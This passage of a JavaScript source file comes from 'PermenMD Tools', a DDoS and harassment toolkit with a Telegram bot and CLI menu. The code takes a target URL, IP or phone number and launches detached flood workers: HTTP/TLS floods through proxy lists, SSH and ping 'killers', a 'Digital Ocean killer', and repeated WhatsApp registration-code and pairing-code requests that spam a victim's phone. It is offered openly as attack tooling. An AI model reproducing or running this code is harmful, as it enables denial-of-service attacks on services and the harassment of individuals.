              { text: 'Back To Main Menu', callback_data: 'main_start' } /*,
              { text: '', callback_data: '' }*/
            ]
          ]
        }
      };

      permenTGBot.onText(/\/start/, (msg) => {
        permenTGBot.sendMessage(telegramId, 'Welcome to **PermenMD Tools**. Select an option:', mainMenu);
      });

      permenTGBot.on('callback_query', async (callbackQuery) => {
        const action = callbackQuery.data;

        switch (action) {
          case 'main_start':
            await permenTGBot.sendMessage(telegramId, 'Welcome to **PermenMD Tools**. Select an option:', mainMenu);
            break;
          case 'kill_ssh':
            await KillSSH1(telegramId, permenTGBot);
            break;
          case 'flood_notif':
            await handleFloodNotif(telegramId, permenTGBot);
            break;
          case 'subdo_finder':
            await subdomainFinder(telegramId, permenTGBot);
            break;
          case 'kill_ping':
            await handleKillPING(telegramId, permenTGBot);
            break;
          case 'kill_do':
            await handleKillDO(telegramId, permenTGBot);
            break;
          case 'kill_otp':
            await handleKillOTP(telegramId, permenTGBot);
            break;
          case 'start_attack':
            await startAttackPrompt(telegramId, permenTGBot);
            break;
          case 'back_cli':
            await permenTGBot.sendMessage(telegramId, 'Bot Will Stop And Back To CLI Mode.')
            await permenTGBot.stopPolling();
            await banner(theme);
            sigma()
            break;
          default:
            permenTGBot.sendMessage(telegramId, 'Unknown action.');
            break;
        }
      });
// [==================================================================================] //
      async function handleKillDO(telegramId, permenTGBot) {
        const pathSSH = path.join(__dirname, `/lib/cache/StarsXSSH`);
        const pathFlood = path.join(__dirname, `/lib/cache/flood`);
        const pathRaw = path.join(__dirname, `/lib/cache/raw`);
        permenTGBot.sendMessage(telegramId, 'Enter Target URL:')
        permenTGBot.once('message', async (msg) => {
          const targetUrl = msg.text;
          permenTGBot.sendMessage(telegramId, 'Enter Target IP:')
          permenTGBot.once('message', async (msg) => {
            const targetIP = msg.text;
            permenTGBot.sendMessage(telegramId, 'Enter Duration:')
            permenTGBot.once('message', async (msg) => {
              const duration = parseInt(msg.text);
              permenTGBot.sendMessage(telegramId, `Attack Started\n**Digital Ocean Killer**\n**Target URL:** ${targetUrl}\n**Target IP:** ${targetIP}\n**Duration:** ${duration}`, extendLimau);
              const SSHWorker = spawn('node', [pathSSH, targetIP, '22', 'root', duration], {
                detached: true,
                stdio: 'ignore',
            });
            const FloodWorker = spawn('node', [pathFlood, targetUrl, duration], {
              detached: true,
              stdio: 'ignore',
          });
          const RawWorker = spawn('node', [pathRaw, `http://${targetIP}`, duration], {
            detached: true,
            stdio: 'ignore',
        });
        RawWorker.unref();
          FloodWorker.unref();
            SSHWorker.unref();
                        })
          })
        })
      }
// [==================================================================================] //
      async function startAttackPrompt(telegramId, permenTGBot) {
        permenTGBot.sendMessage(telegramId, 'Select Attack Methods:', methodsList)
        permenTGBot.once('message', async (msg) => {
          const yabe = msg.text;
          let yabai = ''
          let methods = ''
          let kimakk = ''
          let target = ''
          let duration = ''
          const destroy = path.join(__dirname, `/lib/cache/destroy`);
          const storm = path.join(__dirname, `/lib/cache/storm`);
          const rape = path.join(__dirname, `/lib/cache/rape`);
          const execDestroy =`node ${destroy} ${target} ${duration} 100 1 proxy.txt`
          const execStorm = `node ${storm} ${target} ${duration} 100 1 proxy.txt`
          const execRape =`node ${rape} ${duration} 1 proxy.txt 70 ${target}`
          if (yabe === 'Flood') {
            yabai = 'flood';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Raw') {
            yabai = 'raw';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Strike') {
            yabai = 'strike';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} GET ${target} ${duration} 10 90 proxy.txt --full`;
          } else if (yabe === 'Storm') {
            yabai = 'storm';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Tls') {
            yabai = 'tls';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Rape') {
            yabai = 'rape';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${duration} 10 proxy.txt 70 ${target}`;
          } else if (yabe === 'Destroy') {
            yabai = 'destroy';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Bypass') {
            yabai = 'Bypass';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Kill') {
            yabai = 'kill';
            methods = path.join(__dirname, `/lib/cache/${yabai}`);
              kimakk = `node ${methods} ${target} ${duration} 100 10`;
          } else if (yabe === 'Thunder') {
            yabai = 'thunder'
            methods = path.join(__dirname, `/lib/cache/${yabai}`)
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`
          } else if (yabe === 'Slim') {
            permenTGBot.sendMessage(telegramId, 'Nice Choices.')
          } else {
            permenTGBot.sendMessage(telegramId, 'Undefined Methods')
            return
          }
          permenTGBot.sendMessage(telegramId, 'Enter Target Link:')
          permenTGBot.once('message', async (msg) => {
             target = msg.text;
            permenTGBot.sendMessage(telegramId, 'Enter Duration:')
            permenTGBot.once('message', async (msg) => {
               duration = parseInt(msg.text)
              await permenTGBot.sendMessage(telegramId, `Attack Launched\nMethods: ${yabe}\nTarget: ${target}\nDuration\b${duration}\nCreator: PermenMD`)
              if (yabe === 'Slim') {
                const DestroyWorker = spawn(execDestroy, {
                  detached: true,
                  stdio: 'ignore',
              });
              const StormWorker = spawn(execStorm, {
                detached: true,
                stdio: 'ignore',
            });
            const RapeWorker = spawn(execRape, {
              detached: true,
              stdio: 'ignore',
          });
          DestroyWorker.unref();
          StormWorker.unref();
          RapeWorker.unref();
              } else {
                exec(kimakk)
              }
            })
          })
        })
      }
// [==================================================================================] //
      async function subdomainFinder(telegramId, permenTGBot) {
        permenTGBot.sendMessage(telegramId, 'Enter domain\nExample: google.com');
        permenTGBot.once('message', async (msg) => {
          try {
            let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${msg.text}`);
            let uniqueSubdomains = [...new Set(response.data.data)];
            let hasilmanuk = uniqueSubdomains.map((data) => {
              return `${data}`;
            }).join('\n');
            permenTGBot.sendMessage(telegramId, '**Subdomain Finder** For ' + msg.text + '\n' + hasilmanuk, extendLimau);
          } catch (error) {
            permenTGBot.sendMessage(telegramId, 'Error fetching subdomains. Please try again later.');
          }
        });
      }
// [==================================================================================] //
      async function handleFloodNotif(telegramId, permenTGBot) {
        permenTGBot.sendMessage(telegramId, 'Enter target phone number:');
        permenTGBot.once('message', async (msg) => {
          const phoneNumber = msg.text.replace(/\D/g, '');
          permenTGBot.sendMessage(telegramId, 'Enter duration in seconds:');
          permenTGBot.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              permenTGBot.sendMessage(telegramId, 'Invalid duration.');
            } else {
              permenTGBot.sendMessage(telegramId, `Starting **flood notification** to ${phoneNumber} for ${duration} seconds.`, { parse_mode: 'Markdown' });
              await startFlooder(phoneNumber, duration, telegramId, permenTGBot);
            }
          });
        });
      }
// [==================================================================================] //
      async function handleKillOTP(telegramId, permenTGBot) {
        permenTGBot.sendMessage(telegramId, 'Enter target phone number:');
        permenTGBot.once('message', async (msg) => {
          let phoneNumber = '+' + parseInt(msg.text);
          permenTGBot.sendMessage(telegramId, 'Enter duration in seconds:');
          permenTGBot.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              permenTGBot.sendMessage(telegramId, 'Invalid duration.');
            } else {
              permenTGBot.sendMessage(telegramId, `Starting **flood notification** to ${phoneNumber} for ${duration} seconds.`, { parse_mode: 'Markdown' });
                    await startFlooder1(phoneNumber, duration, telegramId, permenTGBot);
            }
          });
        });
      }
// [==================================================================================] //
      async function handleKillPING(telegramId, permenTGBot) {
        const pathPING = path.join(__dirname, `/lib/cache/ping`);
        permenTGBot.sendMessage(telegramId, 'Enter target IP Address:');
        permenTGBot.once('message', async (msg) => {
          const TargetIP = msg.text
          permenTGBot.sendMessage(telegramId, 'Enter duration in seconds:');
          permenTGBot.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              permenTGBot.sendMessage(telegramId, 'Invalid duration.');
            } else {
              permenTGBot.sendMessage(telegramId, `Attack Started\n**Methods:** KILL PING\n**Target:** ${TargetIP}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathPING} ${TargetIP} 65500 10 10 ${duration}`);
            }
          });
      });
      }
// [==================================================================================] //
      async function KillSSH1(telegramId, permenTGBot) {
        const pathSSH = path.join(__dirname, `/lib/cache/StarsXSSH`);
        permenTGBot.sendMessage(telegramId, 'Enter target IP Address:');
        permenTGBot.once('message', async (msg) => {
          const TargetIP = msg.text
          permenTGBot.sendMessage(telegramId, 'Enter target Port:');
          permenTGBot.once('message', async (msg) => {
            const targetPort = msg.text  
          permenTGBot.sendMessage(telegramId, 'Enter duration in seconds:');
          permenTGBot.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              permenTGBot.sendMessage(telegramId, 'Invalid duration.');
            } else {
              permenTGBot.sendMessage(telegramId, `Attack Started\n**Methods:** KILL SSH\n**Target:** ${TargetIP}\n**Port:** ${targetPort}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathSSH} ${TargetIP} ${targetPort} root ${duration}`);
            }
          });
        });
      });
      }
// [==================================================================================] //
      async function startFlooder1(phoneNumber, duration, telegramId, permenTGBot) {
        const manuk = parsePhoneNumberFromString(phoneNumber);
        const countryCode = manuk.countryCallingCode;
        const nationalNum = manuk.nationalNumber;
      
        try {
          const { state, saveState } = await useMultiFileAuthState('sessions');
      
          const logger = pino({
            level: 'silent',
          });
      
          const conn = makeWaSocket({
            auth: state,
            mobile: true,
            logger: logger,
          });
      
          permenTGBot.sendMessage(
            telegramId,
            'Kill OTP Started\n**Target:** ' + phoneNumber + '\n**Duration:** ' + duration + '\n**Creator: PermenMD**',
            extendLimau
          );
          const requestOTP = async () => {
            try {
              await conn.requestRegistrationCode({
                phoneNumber: '+' + phoneNumber,
                phoneNumberCountryCode: countryCode,
                phoneNumberNationalNumber: nationalNum,
                phoneNumberMobileCountryCode: countryCode
              });
            } catch (error) {
              if (error.reason === 'temporarily_unavailable') {
                clearInterval(intervalId);
      
                console.log('Temporarily unavailable, restarting...');
                setTimeout(() => {
                  intervalId = setInterval(requestOTP, 1000);
                }, 10000);
              } else {
                console.log('Error:', error);
              }
            }
          };
      
          let intervalId = setInterval(requestOTP, 1000);
      
          setTimeout(() => {
            clearInterval(intervalId);
            permenTGBot.sendMessage(telegramId, `Kill OTP stopped after ${duration} seconds.`);
          }, duration * 1000);
          
        } catch (error) {
          console.log('Error during flooder initialization:', error);
        }
      }
// [==================================================================================] //
      async function startFlooder(phoneNumber, duration, telegramId, permenTGBot) {
        try {
          const { version } = await fetchLatestBaileysVersion();
          const { state, saveState } = await useMultiFileAuthState('sessions');
          const logger = pino({ level: 'silent' });
          const conn = makeWASocket({
            printQRInTerminal: false,
            auth: state,
            version: version,
            logger: logger,
          });

          permenTGBot.sendMessage(telegramId, 'Pairing Code Flooder Started\n**Target:** ' + phoneNumber + '\n**Duration:** ' + duration + '\n**Creator: PermenMD**', extendLimau);

          let intervalId = setInterval(async () => {
            try {
              const pairingCode = await conn.requestPairingCode(phoneNumber);
              const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
            } catch (error) {
            }
          }, 1000);

          setTimeout(() => {
            clearInterval(intervalId);
            permenTGBot.sendMessage(telegramId, 'Flooding ended.');
          }, duration * 1000);

        } catch (error) {
        }
      }

    });
  });
}
/* [========================================]
                ██████╗██╗     ██╗
               ██╔════╝██║     ██║
               ██║     ██║     ██║
               ██║     ██║     ██║
               ╚██████╗███████╗██║
                ╚═════╝╚══════╝╚═╝
[========================================] */
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By PermenMD

Thx To:
ChatGPT ( Fixing Error )
IrfanNotSepuh ( Gatau Ngapain )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question(themeQuestion, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| track-ip     | track ip address with info
| subdo-finder | find all subdomain from domain
| kill-wifi    | kill your wifi (termux/linux/windows only)
| kill-ssh     | kill VPS Access 
| kill-otp     | kill WhatsApp OTP Verification
| flood-notif  | Spam WhatsApp Pairing Notification
| kill-ping    | sending death pinger
| samp         | S.A.M.P Flooder
| mc-flood     | Minecraft Bot Flooder
| attack       | launch ddos attack
| udp-raw      | launch udp flood attack
| kill-do      | digital ocean killer
| ongoing      | show ongoing attack
| news         | show latest permenmd news
| ai           | Chat With Ai
| theme        | Change Theme
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| flood      || HTTP(s) Flood DoS
|| tls        || TLS 1.3 
|| strike     || Best DDoS methods
|| kill       || Bypass Cf DDoS methods
|| raw        || Huge RPS Flexing XD
|| bypass     || Bypass With High Power
|| thunder    || Massive Power Methods
|| storm      || The Raining Request
|| rape       || Bypass Protection
|| destroy    || Kill That Socket
|| slim       || Oh Is Fit There
[=========================================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'tg-bot') {
    transformBot(theme);
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`PermenMD Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'theme') {
    chTheme()
  } else if (command === 'flood-notif') {
    flNotif()
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner(theme)
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()